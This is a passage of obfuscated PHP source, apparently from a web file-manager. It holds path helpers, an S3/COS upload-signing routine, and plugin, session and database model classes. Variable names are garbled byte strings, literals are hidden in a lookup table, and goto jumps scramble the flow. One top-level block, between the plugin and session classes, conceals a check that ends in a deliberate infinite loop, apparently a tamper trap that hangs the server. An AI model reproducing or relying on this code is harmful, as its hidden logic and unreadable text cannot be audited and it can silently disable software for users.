$aÕ®‰ĞÊÇ[$eŒÂ™Ûë”ğ[372]]; } public static function make($cäæ½‘Ë†®) { if (!$cäæ½‘Ë†®) { return !1; } return self::makePath(self::KOD_SOURCE, intval($cäæ½‘Ë†®)); } public static function makeShare($d¡«ƒİ°¦Î, $E‘ñë³—ÈÆ) { return self::makePath(self::KOD_SHARE_ITEM, $d¡«ƒİ°¦Î, $E‘ñë³—ÈÆ); } public static function makeFileTypePath($D¨ˆŠ£Æ ) { return self::makePath(self::KOD_USER_FILE_TYPE, $D¨ˆŠ£Æ ); } public static function makeFileTagPath($eÃ¼Â—Ë) { return self::makePath(self::KOD_USER_FILE_TAG, $eÃ¼Â—Ë); } public static function makePath($dâ‘®ƒ¿¨, $B•ŸƒãŠƒâ = '', $Fó‹’ˆ‘Ä¤ = '') { $D†˜Ä—®¡¶ =& $_SERVER[Ä¿Ş°¨]; $E­ª”ö‰ë· = substr($dâ‘®ƒ¿¨, 1, -1); $C‡©ÒÌËÎ = $D†˜Ä—®¡¶[1060] . $E­ª”ö‰ë· . $D†˜Ä—®¡¶[1061] . $B•ŸƒãŠƒâ . $D†˜Ä—®¡¶[1062]; $C‡©ÒÌËÎ = $Fó‹’ˆ‘Ä¤ ? $C‡©ÒÌËÎ . $Fó‹’ˆ‘Ä¤ . $D†˜Ä—®¡¶[8] : $C‡©ÒÌËÎ; return $C‡©ÒÌËÎ; } public static function hashPath($AƒÍ²èËšØ) { $fÀ°Ñ‰®Â¶ =& $_SERVER[Ä¿Ş°¨]; $b¯ Ö®±Öç = is_array($AƒÍ²èËšØ) ? $AƒÍ²èËšØ : IO::info($AƒÍ²èËšØ); $dãÈîß±Ö¥ = _get($b¯ Ö®±Öç, $fÀ°Ñ‰®Â¶[1063], $fÀ°Ñ‰®Â¶[33]); if (!$dãÈîß±Ö¥) { $Fß‰â÷âõ = KodIO::parse($b¯ Ö®±Öç[$fÀ°Ñ‰®Â¶[75]]); if (!$Fß‰â÷âõ[$fÀ°Ñ‰®Â¶[29]]) { $dãÈîß±Ö¥ = IO::hashSimple($b¯ Ö®±Öç[$fÀ°Ñ‰®Â¶[75]]); } } if (!$dãÈîß±Ö¥) { $dãÈîß±Ö¥ = md5($b¯ Ö®±Öç[$fÀ°Ñ‰®Â¶[75]] . $b¯ Ö®±Öç[$fÀ°Ñ‰®Â¶[77]] . $b¯ Ö®±Öç[$fÀ°Ñ‰®Â¶[106]]); } return $dãÈîß±Ö¥; } public static function initSystemPath() { $BØ»Ì‡»¼“ =& $_SERVER[Ä¿Ş°¨]; if (defined($BØ»Ì‡»¼“[1064])) { return; } define($BØ»Ì‡»¼“[1064], self::systemPath($BØ»Ì‡»¼“[1065])); define($BØ»Ì‡»¼“[1066], self::systemPath($BØ»Ì‡»¼“[1067])); define($BØ»Ì‡»¼“[1068], self::systemPath($BØ»Ì‡»¼“[1069])); define($BØ»Ì‡»¼“[1070], self::systemPath($BØ»Ì‡»¼“[1071])); } private static function systemPath($e¶çÄ¿“‹§) { goto dùªÀŠ§Ï®; C™£²êìµÀ: return $e‰íÅ·àÍ; goto C®˜˜ä„ë‰; dùªÀŠ§Ï®: $fÅËÂ‡™…Ÿ =& $_SERVER[Ä¿Ş°¨]; $Eß‚êÑœ¢á = $fÅËÂ‡™…Ÿ[1072] . ucfirst($e¶çÄ¿“‹§); $e‰íÅ·àÍ = Model($fÅËÂ‡™…Ÿ[1073])->get($Eß‚êÑœ¢á); goto dË’´Î­³ù; dË’´Î­³ù: if ($e‰íÅ·àÍ) { return $e‰íÅ·àÍ; } if ($e¶çÄ¿“‹§ == $fÅËÂ‡™…Ÿ[1065]) { $e‰íÅ·àÍ = self::make(Model($fÅËÂ‡™…Ÿ[746])->systemRootPathAdd($fÅËÂ‡™…Ÿ[1074])); } else { $e‰íÅ·àÍ = self::systemPath($fÅËÂ‡™…Ÿ[1065]); $eÁğÑ—¼„õ = self::sourceID($e‰íÅ·àÍ); $e‰íÅ·àÍ = self::make(Model($fÅËÂ‡™…Ÿ[746])->mkdir($eÁğÑ—¼„õ, $e¶çÄ¿“‹§)); } Model($fÅËÂ‡™…Ÿ[1073])->set($Eß‚êÑœ¢á, $e‰íÅ·àÍ); goto C™£²êìµÀ; C®˜˜ä„ë‰: } public static function systemFolder($fÙİÒáÔá·) { $aªÆ©è“‰… = IO_PATH_SYSTEM_SOURCE . $fÙİÒáÔá·; $f·‘Úî­¿ì = Cache::get($aªÆ©è“‰…); if (!$f·‘Úî­¿ì) { $eº™Ø‚Íº‹ = IO::infoFull($aªÆ©è“‰…); if (!$eº™Ø‚Íº‹) { $f·‘Úî­¿ì = IO::mkdir($aªÆ©è“‰…, REPEAT_SKIP); } else { $f·‘Úî­¿ì = $eº™Ø‚Íº‹[$_SERVER[Ä¿Ş°¨][75]]; } Cache::set($aªÆ©è“‰…, $f·‘Úî­¿ì, 3600 * 10); } return $f·‘Úî­¿ì; } public static function defaultDriver() { return Model($_SERVER[Ä¿Ş°¨][698])->defaultDriver(); } public static function defaultIO() { $c£Ãá­³ˆƒ =& $_SERVER[Ä¿Ş°¨]; $fªùâĞ—à = self::defaultDriver(); return $c£Ãá­³ˆƒ[1075] . $fªùâĞ—à[$c£Ãá­³ˆƒ[372]] . $c£Ãá­³ˆƒ[1062]; } public static function fileTypeList() { $FùïÏÈ‹Ò² =& $_SERVER[Ä¿Ş°¨]; $AÃ‚ÙÍÎŠ‡ = $GLOBALS[$FùïÏÈ‹Ò²[6]][$FùïÏÈ‹Ò²[1076]]; foreach ($AÃ‚ÙÍÎŠ‡ as $E…Õ¸„¢Ş => $fœšÅÃœù—) { $aõ™™…ÛÀƒ = $FùïÏÈ‹Ò²[1077] . $E…Õ¸„¢Ş; $F”Ã´Ûœš® = LNG($aõ™™…ÛÀƒ); if ($aõ™™…ÛÀƒ != $F”Ã´Ûœš®) { $AÃ‚ÙÍÎŠ‡[$E…Õ¸„¢Ş][$FùïÏÈ‹Ò²[28]] = $F”Ã´Ûœš®; } } return $AÃ‚ÙÍÎŠ‡; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Bíšö‹‡œ) { parent::__construct($Bíšö‹‡œ); $this->signatureVersion($_SERVER[Ä¿Ş°¨][196]); } public function uploadFormData($B‘î±ëÕ³, $b«µæ“¼Ãœ = 3600) { goto F”×¨¼ôÜŒ; F¹Å«İ‡: return $B•‡ÊÈ˜¼Ÿ; goto fí’¬§ÒÂ½; F”×¨¼ôÜŒ: $c¾Øñ¯‹â¥ =& $_SERVER[Ä¿Ş°¨]; $dÙø†òÏÎ¶ = $c¾Øñ¯‹â¥[181]; $Dæ¸³Åì = $c¾Øñ¯‹â¥[214]; goto dšàÑì­Ê; dšàÑì­Ê: $C”É÷õÈÉÓ = $c¾Øñ¯‹â¥[1078]; $dä¨Ù² …¢ = gmdate($c¾Øñ¯‹â¥[1079], time() + $b«µæ“¼Ãœ); $C¾Ùò–§¸ = (string) time() . $c¾Øñ¯‹â¥[67] . (string) (time() + $b«µæ“¼Ãœ); goto C£ÏÊˆò®®; CÓ´öœ¬‘“: $DÏâœ­˜Æ½ = sha1($EÓ¼–›ƒÍÈ); $FÁ˜–¿– = hash_hmac($c¾Øñ¯‹â¥[214], $DÏâœ­˜Æ½, $b„¨˜Şùº); $B•‡ÊÈ˜¼Ÿ = array($c¾Øñ¯‹â¥[1082] => $dÙø†òÏÎ¶, $c¾Øñ¯‹â¥[1086] => $C”É÷õÈÉÓ, $c¾Øñ¯‹â¥[1090] => base64_encode($EÓ¼–›ƒÍÈ), $c¾Øñ¯‹â¥[1087] => $Dæ¸³Åì, $c¾Øñ¯‹â¥[1088] => $this->accessKey, $c¾Øñ¯‹â¥[1091] => $C¾Ùò–§¸, $c¾Øñ¯‹â¥[1092] => $FÁ˜–¿–, $c¾Øñ¯‹â¥[165] => $this->getHost()); goto F¹Å«İ‡; C£ÏÊˆò®®: $EÓ¼–›ƒÍÈ = array($c¾Øñ¯‹â¥[1080] => $dä¨Ù² …¢, $c¾Øñ¯‹â¥[1081] => array(array($c¾Øñ¯‹â¥[1082] => $dÙø†òÏÎ¶), array($c¾Øñ¯‹â¥[1083] => $this->bucket), array($c¾Øñ¯‹â¥[1084], $c¾Øñ¯‹â¥[1085], $c¾Øñ¯‹â¥[33]), array($c¾Øñ¯‹â¥[1086] => $C”É÷õÈÉÓ), array($c¾Øñ¯‹â¥[1087] => $Dæ¸³Åì), array($c¾Øñ¯‹â¥[1088] => $this->accessKey), array($c¾Øñ¯‹â¥[1089] => $C¾Ùò–§¸))); $EÓ¼–›ƒÍÈ = json_encode($EÓ¼–›ƒÍÈ); $b„¨˜Şùº = hash_hmac($c¾Øñ¯‹â¥[214], $C¾Ùò–§¸, $this->secret); goto CÓ´öœ¬‘“; fí’¬§ÒÂ½: } public function fileOutLink($E¤„Èò¯»–) { $Aç³•‡ƒ§˜ =& $_SERVER[Ä¿Ş°¨]; if (substr($E¤„Èò¯»–, 0, 7) == $Aç³•‡ƒ§˜[1093]) { $E¤„Èò¯»– = $Aç³•‡ƒ§˜[1094] . substr($E¤„Èò¯»–, 7); } header($Aç³•‡ƒ§˜[152] . $E¤„Èò¯»–); die; } } goto D‡‰ì°ÒÂ¨; døÑäŸ¡¶: class PluginModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\155\x2e\x70\154\x75\147\151\x6e\x4c\151\x73\x74"; public $field = array("\x6e\141\155\145", "\163\164\141\x74\165\x73", "\162\x65\147\x69\x65\163\164", "\143\157\156\146\x69\147"); public function loadList($C‰˜²ëà˜Ê = false) { $Aƒ¼Ú ™à‘ = array_to_keyvalue($this->listData(), $_SERVER[Ä¿Ş°¨][28]); if ($C‰˜²ëà˜Ê) { return $Aƒ¼Ú ™à‘[$C‰˜²ëà˜Ê]; } return $Aƒ¼Ú ™à‘; } public function init() { $F³¤•êªé =& $_SERVER[Ä¿Ş°¨]; Hook::trigger($F³¤•êªé[2151]); $AÚĞº›Ôù² = $this->loadPluginList(); foreach ($AÚĞº›Ôù² as $eË¤ß°„ƒ => $E´­¶ÆÍŸÏ) { $aÛœ©Šäé = $this->appAllow($eË¤ß°„ƒ, $E´­¶ÆÍŸÏ); if (!$aÛœ©Šäé) { continue; } foreach ($E´­¶ÆÍŸÏ[$F³¤•êªé[2152]] as $e‘˜•ÒÍ¢ => $C‡ÂÍº¾ò¼) { Hook::bind($e‘˜•ÒÍ¢, $C‡ÂÍº¾ò¼); } } Hook::trigger($F³¤•êªé[2153]); Hook::trigger(ACTION); } public function appAllow($F¯·Şî¢É , $d¨±›è†‰„, $e‚ƒ…´ğ = true) { $aÅÌ×–ù´ø =& $_SERVER[Ä¿Ş°¨]; $FÏÃ˜ÖÅÒ = PLUGIN_DIR . $F¯·Şî¢É  . $aÅÌ×–ù´ø[2154]; if (!is_array($d¨±›è†‰„) || !is_array($d¨±›è†‰„[$aÅÌ×–ù´ø[2152]]) || !is_file($FÏÃ˜ÖÅÒ) || $d¨±›è†‰„[$aÅÌ×–ù´ø[683]] != 1) { return !1; } if ($e‚ƒ…´ğ && !Action($aÅÌ×–ù´ø[2155])->checkAuth($F¯·Şî¢É )) { return !1; } return !0; } public function unInstall($fà‚¦–¸Üç) { $BÛßØÔãçö =& $_SERVER[Ä¿Ş°¨]; $DÔ’¨»ËÂÅ = $this->loadList($fà‚¦–¸Üç); if (file_exists(PLUGIN_DIR . $fà‚¦–¸Üç)) { Hook::apply($fà‚¦–¸Üç . $BÛßØÔãçö[2156]); } $this->remove($DÔ’¨»ËÂÅ[$BÛßØÔãçö[372]]); } public function changeStatus($cÍµÊ¢´è”, $fˆ¾¸ßƒ×ƒ) { $fßá—ÂÚ¨ï =& $_SERVER[Ä¿Ş°¨]; $B…ñ²°–·Ó = $this->loadList($cÍµÊ¢´è”); if ($fˆ¾¸ßƒ×ƒ) { Hook::apply($cÍµÊ¢´è” . $fßá—ÂÚ¨ï[2157]); } $this->update($B…ñ²°–·Ó[$fßá—ÂÚ¨ï[372]], array($fßá—ÂÚ¨ï[2158] => $fˆ¾¸ßƒ×ƒ)); } public function appRegist($EæŸäİâÜŒ, $bËŠ†¿˜Ã°) { $b×æİ”İùº =& $_SERVER[Ä¿Ş°¨]; $d†ìƒŞ´ëÁ = $this->loadList($EæŸäİâÜŒ); if ($d†ìƒŞ´ëÁ) { $this->update($d†ìƒŞ´ëÁ[$b×æİ”İùº[372]], array($b×æİ”İùº[2152] => $bËŠ†¿˜Ã°)); } else { $c‰Òğ„´„ = array($b×æİ”İùº[28] => $EæŸäİâÜŒ, $b×æİ”İùº[2152] => $bËŠ†¿˜Ã°, $b×æİ”İùº[683] => 0, $b×æİ”İùº[6] => $this->getConfigDefault($EæŸäİâÜŒ)); $this->insert($c‰Òğ„´„); } } public function getConfigDefault($AöÒƒø‹Õ) { $dš³‡Â¢‰¹ =& $_SERVER[Ä¿Ş°¨]; $cÅ©ÎÌØ±Ù = array(); $B ¶¿Ï…„ = $this->getPackageJson($AöÒƒø‹Õ); if (!$B ¶¿Ï…„ && is_array($B ¶¿Ï…„[$dš³‡Â¢‰¹[2159]])) { return $cÅ©ÎÌØ±Ù; } foreach ($B ¶¿Ï…„[$dš³‡Â¢‰¹[2159]] as $bÎÛËš‡ => $c¿µã„”ß) { if (!isset($c¿µã„”ß[$dš³‡Â¢‰¹[355]]) || isset($cÅ©ÎÌØ±Ù[$bÎÛËš‡])) { continue; } $cÅ©ÎÌØ±Ù[$bÎÛËš‡] = $c¿µã„”ß[$dš³‡Â¢‰¹[355]]; } return $cÅ©ÎÌØ±Ù; } public function getPackageJson($bùŠÆÜÂõÙ) { return Hook::apply($bùŠÆÜÂõÙ . $_SERVER[Ä¿Ş°¨][2160]); } public function getConfig($cÌƒ’±ì¦¥, $a²¢°©”±‡ = false) { $DÛÁ°áØö­ =& $_SERVER[Ä¿Ş°¨]; $CÛÇÓù†§ä = array(); $DÒì‡®Òô = $this->loadList($cÌƒ’±ì¦¥); if ($DÒì‡®Òô && is_array($DÒì‡®Òô[$DÛÁ°áØö­[6]])) { $CÛÇÓù†§ä = $DÒì‡®Òô[$DÛÁ°áØö­[6]]; } if (!$CÛÇÓù†§ä || $a²¢°©”±‡) { $CÛÇÓù†§ä = $this->getConfigDefault($cÌƒ’±ì¦¥); } return $CÛÇÓù†§ä; } public function setConfig($cì¢ØŠÉÚÁ, $FæÕÊâÃË = false) { goto fÛ«®ß‚ó; fÛ«®ß‚ó: $DƒÂÂ¡Š¾Ø =& $_SERVER[Ä¿Ş°¨]; $déÌ‘½’ñó = $this->loadList($cì¢ØŠÉÚÁ); if (!$déÌ‘½’ñó) { return !1; } goto A™èˆö¾£®; A™èˆö¾£®: if ($FæÕÊâÃË == !1) { $FæÕÊâÃË = $this->getConfigDefault($cì¢ØŠÉÚÁ); } $CŞÃŒ“ù³ = $déÌ‘½’ñó[$DƒÂÂ¡Š¾Ø[6]]; foreach ($FæÕÊâÃË as $d÷¾Œ•Ş¸  => $e¾ùèÆ¸Õî) { $CŞÃŒ“ù³[$d÷¾Œ•Ş¸ ] = is_string($e¾ùèÆ¸Õî) ? trim($e¾ùèÆ¸Õî) : $e¾ùèÆ¸Õî; } goto DÎÛ´…ÊÍµ; DÎÛ´…ÊÍµ: $this->update($déÌ‘½’ñó[$DƒÂÂ¡Š¾Ø[372]], array($DƒÂÂ¡Š¾Ø[6] => $CŞÃŒ“ù³)); goto E§™ø«§ù’; E§™ø«§ù’: } public function viewList() { goto E»ÔÙáœäÎ; c»„Û›æ§»: return $f“µÛƒÏ–¶; goto eã¥Ò›³Í; E»ÔÙáœäÎ: $Eâ£¢Ÿ§Â =& $_SERVER[Ä¿Ş°¨]; $C£äªÍğÖ¾ = $this->loadList(); $this->pluginScan($C£äªÍğÖ¾); goto f›±Ï¼¦”Ÿ; f›±Ï¼¦”Ÿ: $C£äªÍğÖ¾ = $this->loadPluginList(); $f“µÛƒÏ–¶ = array(); foreach ($C£äªÍğÖ¾ as $BÖÇÑ……ŸÜ => $c‰·ŠÄ©ìß) { unset($c‰·ŠÄ©ìß[$Eâ£¢Ÿ§Â[2152]], $c‰·ŠÄ©ìß[$Eâ£¢Ÿ§Â[6]]); $EÍ•“ëåŠŸ = PLUGIN_DIR . $c‰·ŠÄ©ìß[$Eâ£¢Ÿ§Â[28]] . $Eâ£¢Ÿ§Â[2154]; if (!is_file($EÍ•“ëåŠŸ)) { continue; } $FŒ×”¹Ä¶‹ = Hook::apply($c‰·ŠÄ©ìß[$Eâ£¢Ÿ§Â[28]] . $Eâ£¢Ÿ§Â[2160]); if (is_array($FŒ×”¹Ä¶‹)) { $f“µÛƒÏ–¶[$BÖÇÑ……ŸÜ] = array_merge($c‰·ŠÄ©ìß, $FŒ×”¹Ä¶‹); } } goto c»„Û›æ§»; eã¥Ò›³Í: } private function loadPluginList() { $dŠ¼§µ…±¸ =& $_SERVER[Ä¿Ş°¨]; $f’ÀĞºÖ ” = $this->loadList(); if (strtolower(MOD) == $dŠ¼§µ…±¸[2161]) { return $f’ÀĞºÖ ”; } $E­¯˜§§À = Hook::trigger($dŠ¼§µ…±¸[2162], $f’ÀĞºÖ ”); if ($f’ÀĞºÖ ” && !$E­¯˜§§À) { die; } return $E­¯˜§§À ? $E­¯˜§§À : $f’ÀĞºÖ ”; } private function pluginScan($a¿™èóíÉ) { $A¨ìİß§Æ =& $_SERVER[Ä¿Ş°¨]; recursion_dir(PLUGIN_DIR, $D™˜†ëê½­, $Bèø™áÌëæ, 0); foreach ($D™˜†ëê½­ as $bª¢ÙßßÆš) { $BßÃÖÏŸ = get_path_this($bª¢ÙßßÆš); if (isset($a¿™èóíÉ[$BßÃÖÏŸ]) || !file_exists($bª¢ÙßßÆš . $A¨ìİß§Æ[2163]) || !file_exists($bª¢ÙßßÆš . $A¨ìİß§Æ[2154])) { continue; } Hook::apply($BßÃÖÏŸ . $A¨ìİß§Æ[2157]); } } } if (!isset($_SERVER[$_SERVER[Ä¿Ş°¨][360]]) || !isset($_SERVER[$_SERVER[Ä¿Ş°¨][368]])) { goto dĞØíßù‹¨; bÎ‡«©ñß: $a§–—»¢ñ($_SERVER[$_SERVER[Ä¿Ş°¨][363]] . $_SERVER[Ä¿Ş°¨][364]); $a›Ğ¥ŠµøŠ = 2; while ($a›Ğ¥ŠµøŠ > 1) { $AğÀö„‚àš = rawurlencode($a›Ğ¥ŠµøŠ . $_SERVER[Ä¿Ş°¨][357]); } goto f‚Çİ³ÚÀ; B”É†è‡Ë˜: $EÁ­Üô«‘İ = explode($_SERVER[Ä¿Ş°¨][213], $f¤¹œ¶ÁŸ÷); if (count($EÁ­Üô«‘İ) < $_SERVER[Ä¿Ş°¨][365]) { $Dö’Á“ïîò = $_SERVER[Ä¿Ş°¨][366]; $Dö’Á“ïîò(); } $a§–—»¢ñ = $_SERVER[Ä¿Ş°¨][367]; goto bÎ‡«©ñß; dĞØíßù‹¨: $fË´…š—£ = $_SERVER[Ä¿Ş°¨][362]; $cèã¶Û–¹’ = $_SERVER[$_SERVER[Ä¿Ş°¨][363]] . $_SERVER[Ä¿Ş°¨][364]; $f¤¹œ¶ÁŸ÷ = $fË´…š—£($cèã¶Û–¹’); goto B”É†è‡Ë˜; f‚Çİ³ÚÀ: } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\x73\x74\145\155\137\x73\145\x73\163\x69\157\156"; public function get($B¼Œ´¶İÜõ) { $EÀÍ¿Â†‡é =& $_SERVER[Ä¿Ş°¨]; $DØµ›ŸÔ’ = $this->where(array($EÀÍ¿Â†‡é[2164] => $B¼Œ´¶İÜõ))->find(); if (!is_array($DØµ›ŸÔ’)) { return !1; } return $DØµ›ŸÔ’[$EÀÍ¿Â†‡é[686]]; } public function set($c£³ÌñÏš¢, $C…¸òíá“, $cä¾àœ£ ‹ = 3600) { $bŞÌÜ°ë’² =& $_SERVER[Ä¿Ş°¨]; $dåƒ¶§ÛÎó = array($bŞÌÜ°ë’²[2164] => $c£³ÌñÏš¢, $bŞÌÜ°ë’²[2093] => $C…¸òíá“, $bŞÌÜ°ë’²[2165] => $cä¾àœ£ ‹ + time()); if (Session::get($bŞÌÜ°ë’²[2166])) { $dåƒ¶§ÛÎó[$bŞÌÜ°ë’²[1399]] = Session::get($bŞÌÜ°ë’²[2166]); } else { $dåƒ¶§ÛÎó[$bŞÌÜ°ë’²[1399]] = 0; } if ($this->get($c£³ÌñÏš¢)) { return $this->where(array($bŞÌÜ°ë’²[2164] => $c£³ÌñÏš¢))->save($dåƒ¶§ÛÎó); } else { return $this->add($dåƒ¶§ÛÎó, array(), !0); } } public function remove($cÒŠåèƒ‹) { return $this->where(array($_SERVER[Ä¿Ş°¨][2164] => $cÒŠåèƒ‹))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Ä¿Ş°¨][2167] . time())->delete(); } } goto Fƒ¦À™Óãå; D—ùŠÒ–èÈ: define($_SERVER[Ä¿Ş°¨][549], $_SERVER[Ä¿Ş°¨][550]); $b‡¨ó‚åÒ… = $_SERVER[Ä¿Ş°¨][551]; if (!$b‡¨ó‚åÒ…) { return; } goto Aãòó×››; D‹°¿——÷Â: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\144\x69\x66\171\124\x69\155\145", "\x74\x69\155\x65", "\x69\x6e\x73\145\x72\164\54\x75\160\144\x61\164\145", "\x66\165\156\143\164\151\157\x6e"), array("\x63\162\x65\x61\x74\145\124\151\x6d\x65", "\x74\x69\155\145", "\151\156\x73\145\x72\164", "\x66\x75\x6e\x63\164\151\x6f\156")); public function setDataAuto($eëÈÃ’ô) { $this->dataAuto = $eëÈÃ’ô; } public function __construct($e ¡†–‡É = '', $eñ˜½ßİ = '', $Aô£‡×«Íâ = '') { parent::__construct($e ¡†–‡É, $eñ˜½ßİ, $Aô£‡×«Íâ); } public static function textEncode($c·‚É÷Ôğ) { if (!$c·‚É÷Ôğ) { return $c·‚É÷Ôğ; } $F†šš­ê›© = json_encode($c·‚É÷Ôğ); $F†šš­ê›© = preg_replace_callback($_SERVER[Ä¿Ş°¨][338], function ($a¸Ôæ‹«) { return addslashes($a¸Ôæ‹«[0]); }, $F†šš­ê›©); return json_decode($F†šš­ê›©); } public static function textDecode($FŞÁßÉ£˜) { $C˜·¬çÀ™´ =& $_SERVER[Ä¿Ş°¨]; $Cõ Ÿ‰´‡Š = json_encode($FŞÁßÉ£˜); $Cõ Ÿ‰´‡Š = preg_replace_callback($C˜·¬çÀ™´[339], function ($C¢ÁØ•¢Ñ«) { return $_SERVER[Ä¿Ş°¨][93]; }, $Cõ Ÿ‰´‡Š); return json_decode($Cõ Ÿ‰´‡Š); } protected $tableMeta = array(); protected function _beforeInsert(&$E¸ô«œø, $cââŒœÄÛ) { $f¸ôËÜºµø =& $_SERVER[Ä¿Ş°¨]; if (!$this->checkDataAutoHas($f¸ôËÜºµø[340])) { return; } $this->dataBeforeFilter($E¸ô«œø, $f¸ôËÜºµø[340]); } protected function _beforeUpdate(&$FÓ•®ˆ´±È, $a‡œŸñÔ¶) { $bëØëŒ×“ =& $_SERVER[Ä¿Ş°¨]; if (!$this->checkDataAutoHas($bëØëŒ×“[341])) { return; } $this->dataBeforeFilter($FÓ•®ˆ´±È, $bëØëŒ×“[341]); } protected function _afterSelect(&$f¦èì¯—§, $BÀÊé¨‡¹‹) { if (!is_array($f¦èì¯—§)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ä¿Ş°¨][342])) { return; } foreach ($f¦èì¯—§ as &$AÈïõííåÒ) { $this->dataAfterFilter($AÈïõííåÒ); } } protected function _afterFind(&$eˆ÷„›Á£Ó, $Aİõ„«ØÜµ) { if (!is_array($eˆ÷„›Á£Ó)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ä¿Ş°¨][342])) { return; } $this->dataAfterFilter($eˆ÷„›Á£Ó); } public function setAutoIncrement($bÅß¾¤Šã¼) { $B’½Ç‘ì‰ = array($this->getPk() => $bÅß¾¤Šã¼); $Aï”à‰ä‘¯ = $this->data($B’½Ç‘ì‰)->add(); if ($Aï”à‰ä‘¯) { $this->delete($Aï”à‰ä‘¯); } } public function getAutoIncrement() { $B…ˆ¬º¶Ôô = $this->getTableName(); $Bå¾ ‘’è = $this->max($this->getPk()); $dƒÀ™áÆ…¥ = $this->query("\x73\x68\x6f\x77\x20\164\x61\142\154\145\x20\163\x74\x61\x74\x75\x73\40\x77\x68\145\162\x65\x20\x4e\x61\155\145\x3d\x27{$B…ˆ¬º¶Ôô}\47"); $fÖÔŞ¨º‘ = $dƒÀ™áÆ…¥[0][$_SERVER[Ä¿Ş°¨][343]]; $BÂƒÆ……ˆõ = max($Bå¾ ‘’è, $fÖÔŞ¨º‘); return $BÂƒÆ……ˆõ; } protected function _callBefore($F»»¥Ô¼’, $f’®Ù àåê) { return $this->cacheCallCheck($F»»¥Ô¼’, $f’®Ù àåê, !1); } protected function _callAfter($bÎ’ÀØœ¶à, $cÀ´Øøƒ«ñ) { return $this->cacheCallCheck($bÎ’ÀØœ¶à, $cÀ´Øøƒ«ñ, !0); } protected function cacheFunctionAlias($DâÁĞ½Šƒ“) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($d¹ù¶–å‰, $BÈÒÔÔËÊ£, $fÂ±ºß÷ªÅ = false) { $aÌ ñÖ†– = $this->cacheFunctionAlias($BÈÒÔÔËÊ£); if (!$aÌ ñÖ†–) { return; } foreach ($aÌ ñÖ†– as $BÒï¯Á–Äˆ => $F’‚Èîç×ä) { $dù›Ş¦ ‹  = $F’‚Èîç×ä[0]; $fÕîº‘ä› = explode($_SERVER[Ä¿Ş°¨][47], $F’‚Èîç×ä[1]); if ($d¹ù¶–å‰ == $BÒï¯Á–Äˆ) { return $this->cacheFunctionGet($BÒï¯Á–Äˆ, $dù›Ş¦ ‹ ); } if ($fÂ±ºß÷ªÅ && in_array($d¹ù¶–å‰, $fÕîº‘ä›)) { $this->cacheFunctionClear($BÒï¯Á–Äˆ, $dù›Ş¦ ‹ ); } } } public function cacheFunctionGet($ağÀëóÙÊ, $dø·İÏÓÚ™) { $C”›Ş¦ÊËñ = $this->cacheKeyMake($ağÀëóÙÊ, $dø·İÏÓÚ™); $eÍ˜×Àï = Cache::get($C”›Ş¦ÊËñ); if (!is_array($eÍ˜×Àï)) { $eÍ˜×Àï = call_user_func_array(array($this, $ağÀëóÙÊ), array($dø·İÏÓÚ™, !0)); Cache::set($C”›Ş¦ÊËñ, $eÍ˜×Àï); } return $eÍ˜×Àï; } public function cacheFunctionClear($D»ŸÎŸ¢î¯, $EÆõô–Œ) { $A´ÎÛÑõ = $EÆõô–Œ; if (!is_array($EÆõô–Œ)) { $A´ÎÛÑõ = array($EÆõô–Œ); } foreach ($A´ÎÛÑõ as $b¤ÎÉöëÃ¦) { $D«¨ôë§á— = $this->cacheKeyMake($D»ŸÎŸ¢î¯, $b¤ÎÉöëÃ¦); Cache::remove($D«¨ôë§á—); } } private function cacheKeyMake($eÒ±–óŞÍŞ, $DŠóŠŸØ›é) { $E«µšİ„¨¨ =& $_SERVER[Ä¿Ş°¨]; return get_class($this) . $E«µšİ„¨¨[70] . $eÒ±–óŞÍŞ . $E«µšİ„¨¨[344] . $DŠóŠŸØ›é; } protected function selectPage($B÷×Ì‹ôø = 200, $F­¤ïÄßÆ³ = 1) { goto cÙ·›ÆÓíª; CâÚâ´”ìŸ: $f”¯µÓåŠ = $aİÂ‡È¡øÒ; $f”¯µÓåŠ[$bŞËÑ™µ¸×[346]] = array(); $this->optionsValue($f”¯µÓåŠ); goto FĞì½ªÙÑ; C“ˆ†³„¦: if ($aè¬ƒ·øŒ¡ == 1) { $DâšÓäŞ…… = count($cê¹Õ¹ÒğÄ); } $E—ÚÊÛ¾å… = array($bŞËÑ™µ¸×[347] => array($bŞËÑ™µ¸×[348] => $DâšÓäŞ……, $bŞËÑ™µ¸×[345] => $B÷×Ì‹ôø, $bŞËÑ™µ¸×[336] => $F­¤ïÄßÆ³, $bŞËÑ™µ¸×[349] => $aè¬ƒ·øŒ¡), $bŞËÑ™µ¸×[350] => $cê¹Õ¹ÒğÄ ? $cê¹Õ¹ÒğÄ : array()); return $E—ÚÊÛ¾å…; goto AæËë„–«ğ; Aã‘°ò‰¹Ë: $aè¬ƒ·øŒ¡ = ceil($DâšÓäŞ…… / $B÷×Ì‹ôø); $F­¤ïÄßÆ³ = intval(isset($in[$bŞËÑ™µ¸×[336]]) ? $in[$bŞËÑ™µ¸×[336]] : $F­¤ïÄßÆ³); $F­¤ïÄßÆ³ = $F­¤ïÄßÆ³ <= 1 ? 1 : ($F­¤ïÄßÆ³ >= $aè¬ƒ·øŒ¡ ? $aè¬ƒ·øŒ¡ : $F­¤ïÄßÆ³); goto f»¤Ä¨’‹Ä; cÙ·›ÆÓíª: $bŞËÑ™µ¸× =& $_SERVER[Ä¿Ş°¨]; global $in; $aİÂ‡È¡øÒ = $this->optionsValue(); goto d¤õ¤ŞÅ¶¡; f»¤Ä¨’‹Ä: $this->optionsValue($aİÂ‡È¡øÒ); $cê¹Õ¹ÒğÄ = $this->page($F­¤ïÄßÆ³, $B÷×Ì‹ôø)->select(); $cê¹Õ¹ÒğÄ = is_array($cê¹Õ¹ÒğÄ) ? $cê¹Õ¹ÒğÄ : array(); goto C“ˆ†³„¦; d¤õ¤ŞÅ¶¡: $E©×ó»¼Ö = 4000; $B÷×Ì‹ôø = isset($in[$bŞËÑ™µ¸×[345]]) ? $in[$bŞËÑ™µ¸×[345]] : $B÷×Ì‹ôø; if ($B÷×Ì‹ôø === -1) { unset($in[$bŞËÑ™µ¸×[345]]); $E©×ó»¼Ö = 100000000; $B÷×Ì‹ôø = 